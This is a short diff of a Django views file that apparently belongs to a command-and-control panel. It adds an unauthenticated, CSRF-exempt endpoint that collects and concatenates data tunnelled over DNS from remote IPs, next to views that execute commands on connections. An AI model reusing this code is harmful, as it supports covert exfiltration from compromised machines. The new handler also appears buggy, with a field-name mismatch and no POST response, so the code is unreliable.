@@ -93,11 +93,11 @@ def update_conn(request):
         
 
         objects = Connection.objects.exclude(ip__in = data.keys())
-
         objects.update(recent_status="Inactive")
             
         return HttpResponse("Data Received")
 
+# restrict to user
 def exec_conn(request, ip):
 
     if not request.user.is_authenticated:
@@ -140,6 +140,7 @@ def exec_conn(request, ip):
 
     return HttpResponseForbidden("Invalid")    
 
+# restrict to user
 def exec_hist(request):
     if request.method == "GET":
         ip = request.GET.get("ip")
@@ -154,8 +155,6 @@ def exec_hist(request):
 
         return JsonResponse(resp)
         
-
-
 # restrict to user
 def refresh_conn(request):
     if not request.user.is_authenticated:
@@ -200,3 +199,22 @@ def refresh_conn(request):
                 
         
     return HttpResponseForbidden("Invalid Method")
+
+# not restricted to user
+@csrf_exempt
+def dns_tunnelled_data_handler(request):
+    if request.method == "POST":
+        ip = request.POST["ip"]
+        data = request.POST["data"]
+
+        dns_response_object= DNS_Response.objects.filter(ip=ip)
+        
+        if not dns_response_object:
+            dns_response_object = DNS_Response(ip=ip, data=data)
+            dns_response_object.save()
+        else:
+            concatenated_data = dns_response_object.get(ip=ip).dns_response_data + data
+            dns_response_object.update(dns_response_data = concatenated_data)
+            
+    else:
+        return HttpResponseForbidden("Invalid Method")
